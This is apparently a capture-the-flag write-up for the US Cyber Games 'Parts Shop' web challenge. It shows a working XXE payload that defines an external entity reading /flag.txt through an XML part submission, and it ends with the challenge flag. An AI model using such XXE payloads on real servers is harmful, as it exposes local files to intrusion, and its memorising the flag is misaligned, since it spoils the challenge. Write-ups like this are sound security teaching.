---
title: US Cyber Games [Season 4] - Parts Shop
date: Mon Jun  3 01:22:40 PM EDT 2024
categories: [Writeup]
tags: [ctf,uscybergames,uscybergames2024,web,xxe]
---

## Description

Parts Shop [Web]

We've found an online shop for robot parts. We suspect ARIA is trying to embody itself to take control of the physical world. You need to stop it ASAP! (Note: The flag is located in `/flag.txt`)

[https://uscybercombine-s4-parts-shop.chals.io/](https://uscybercombine-s4-parts-shop.chals.io/)

## Solution

The app allows us to view and add parts:
![Parts Shop](/assets/images/USCyberGames/2024/Parts Shop.png)

Add test item:
![Parts Shop-1](/assets/images/USCyberGames/2024/Parts Shop-1.png)

It seems like image is getting embedded and it can be a link
![Parts Shop-2](/assets/images/USCyberGames/2024/Parts Shop-2.png)

Since we need `/flag.txt` this could probably be LFI with `file://` protocol

We are sending new parts data as XML
![Parts Shop-3](/assets/images/USCyberGames/2024/Parts Shop-3.png)

Looks like we can't utilize `file` protocol:
![Parts Shop-4](/assets/images/USCyberGames/2024/Parts Shop-4.png)

Since XML is being sent we could try XXE payloads to embed the contents of file into item.

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md

Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [<!ENTITY flag SYSTEM 'file:///flag.txt'>]>
<part>
  <name>&flag;</name>
  <author>test2</author>
  <image>test3</image>
  <description>test4</description>
</part>
```

![Parts Shop-5](/assets/images/USCyberGames/2024/Parts Shop-5.png)

 > Flag: **SIVBGR{fu11y_upgr4d3d}**
 {: .prompt-tip }